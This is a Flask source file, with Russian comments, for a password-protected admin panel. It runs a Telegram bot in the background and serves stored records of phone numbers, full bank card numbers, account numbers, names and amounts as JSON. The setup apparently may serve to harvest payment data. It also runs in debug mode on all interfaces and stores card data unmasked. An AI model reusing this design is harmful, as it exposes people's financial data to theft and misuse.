from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from config import ADMIN_PASSWORD, SESSION_COOKIE_NAME, SESSION_SECRET_KEY
from database import get_all_data, add_session, check_session, delete_session
import uuid
import threading
from bot import TelegramBot

app = Flask(__name__)
app.secret_key = SESSION_SECRET_KEY
app.config['SESSION_COOKIE_NAME'] = SESSION_COOKIE_NAME

# Запуск Telegram бота в отдельном потоке
def run_bot():
    bot = TelegramBot()
    bot.run()

# Запускаем бота в фоновом потоке
bot_thread = threading.Thread(target=run_bot, daemon=True)
bot_thread.start()

@app.route('/')
def index():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('login'))
    
    data = get_all_data()
    return render_template('index.html', 
                         admin_data=data['admin_data'], 
                         user_data=data['user_data'])

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password')
        remember = request.form.get('remember')
        
        if password == ADMIN_PASSWORD:
            session['authenticated'] = True
            
            # Если выбрано "Запомнить меня", создаем сессию в БД
            if remember:
                session_id = str(uuid.uuid4())
                session['session_id'] = session_id
                add_session(session_id)
            
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error="Неверный пароль")
    
    # Проверяем сохраненную сессию
    if 'session_id' in session:
        if check_session(session['session_id']):
            session['authenticated'] = True
            return redirect(url_for('index'))
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    if 'session_id' in session:
        delete_session(session['session_id'])
    
    session.clear()
    return redirect(url_for('login'))

@app.route('/api/data')
def api_data():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = get_all_data()
    
    # Форматируем данные для JSON
    formatted_data = {
        'admin_data': [
            {
                'id': row[0],
                'phone': row[1],
                'card': row[2],
                'email': row[3],
                'amount': row[4],
                'bank': row[5],
                'created_at': row[6]
            }
            for row in data['admin_data']
        ],
        'user_data': [
            {
                'id': row[0],
                'user_id': row[1],
                'username': row[2],
                'name': f"{row[3] or ''} {row[4] or ''}".strip(),
                'fio': row[5],
                'card_number': row[6],
                'account_number': row[7],
                'phone': row[8],
                'created_at': row[10]
            }
            for row in data['user_data']
        ]
    }
    
    return jsonify(formatted_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)